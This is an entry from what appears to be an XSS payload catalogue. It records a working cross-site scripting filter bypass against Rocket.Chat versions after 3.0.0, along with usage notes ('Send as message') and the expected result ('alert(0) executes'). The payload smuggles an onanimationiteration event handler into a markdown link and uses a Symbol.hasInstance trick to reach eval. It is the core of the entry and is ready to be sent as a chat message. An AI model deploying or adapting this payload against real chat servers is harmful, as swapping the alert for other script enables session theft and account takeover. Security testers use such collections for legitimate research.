---
data: >-
  https://a?p=[ ](https://a.de?
  style=animation-duration:1s;animation-name:blink;animation-iteration-count:2
  onanimationiteration='alert\x280\x29'instanceof{[Symbol.hasInstance]:eval}`.")
tags:
  - xss
  - bypass
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.238Z'
id: efa49ab3-3ced-4771-b5af-b8625f5322c2
verified: false
validated: true
submitted: true
---
# rocket-chat-postfix-bypass-alert1

## Command

```javascript
https://a?p=[ ](https://a.de? style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration='alert\x280\x29'instanceof{[Symbol.hasInstance]:eval}`.")
```

## Description

Post-v3.0.0 bypass payload for alert(0).

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| https://a.de? | Adjusted URL | Yes |

## Examples

Send as message.

## Expected Output

alert(0) executes.

## Related

- [[commands/rocket-chat-xss-payload-alert]]
